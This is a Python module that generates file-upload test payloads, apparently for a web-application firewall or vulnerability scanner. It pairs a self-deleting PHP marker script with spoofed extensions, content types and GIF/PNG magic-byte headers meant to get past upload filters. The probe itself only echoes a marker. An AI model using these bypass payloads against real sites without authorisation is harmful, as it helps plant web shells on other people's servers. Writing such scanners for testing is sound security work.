import json
import random
import uuid
from dataclasses import dataclass
from pathlib import Path


@dataclass(slots=True, frozen=True)
class FilePayload:
    filename: str
    content: bytes
    content_type: str
    attack_type: str


_CONFIG_PATH = Path("config") / "payloads" / "file_upload" / "file_upload_payloads.json"


def _load_payload_config() -> dict:
    if not _CONFIG_PATH.exists():
        raise FileNotFoundError(f"File upload payload config not found: {_CONFIG_PATH}")
    try:
        with _CONFIG_PATH.open("r", encoding="utf-8") as f:
            loaded = json.load(f)
    except OSError as exc:
        raise OSError(f"Failed to read payload config: {_CONFIG_PATH}") from exc
    except json.JSONDecodeError as exc:
        raise ValueError(f"Invalid JSON payload config: {_CONFIG_PATH}") from exc
    if not isinstance(loaded, dict):
        raise ValueError(f"Payload config root must be object: {_CONFIG_PATH}")
    return loaded


def generate_payloads() -> list[FilePayload]:
    config = _load_payload_config()

    base_webshell = b"<?php echo 'WAF_UPLOAD_VULN_DETECTED'; unlink(__FILE__); ?>"
    gif_webshell = b"GIF89a;\n" + base_webshell
    png_webshell = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR" + base_webshell

    payloads: list[FilePayload] = []
    extensions = [str(ext) for ext in config.get("extensions", []) if str(ext)]
    content_types = [str(ct) for ct in config.get("content_types", []) if str(ct)]
    base_names = [str(name) for name in config.get("base_names", []) if str(name)] or ["upload"]

    def get_random_filename(ext: str, prefix: str = "") -> str:
        if not prefix:
            prefix = random.choice(base_names)
        random_str = uuid.uuid4().hex[:6]
        return f"{prefix}_{random_str}.{ext}"

    for ext in extensions:
        for c_type in content_types:
            filename = get_random_filename(ext)
            subtype = c_type.split("/", 1)[-1]
            payloads.append(
                FilePayload(filename, base_webshell, c_type, f"Bypass_{ext}_CT_{subtype}")
            )

    payloads.append(FilePayload(get_random_filename("php", "avatar"), gif_webshell, "image/gif", "Magic_Byte_GIF"))
    payloads.append(FilePayload(get_random_filename("php", "receipt"), png_webshell, "image/png", "Magic_Byte_PNG"))

    for ext in config.get("magic_byte_extensions", []):
        ext_text = str(ext).strip()
        if not ext_text:
            continue
        filename = get_random_filename(ext_text, "image")
        payloads.append(FilePayload(filename, gif_webshell, "image/gif", f"Magic_Byte_GIF_{ext_text}"))

    for classic in config.get("classic_payloads", []):
        if not isinstance(classic, dict):
            continue
        ext = str(classic.get("extension", "")).strip()
        if not ext:
            continue
        prefix = str(classic.get("prefix", "")).strip()
        content_type = str(classic.get("content_type", "application/x-php")).strip()
        attack_type = str(classic.get("attack_type", f"Classic_{ext}")).strip()
        payloads.append(
            FilePayload(
                get_random_filename(ext, prefix),
                base_webshell,
                content_type,
                attack_type,
            )
        )

    return payloads


def get_file_upload_payloads() -> list[FilePayload]:
    return generate_payloads()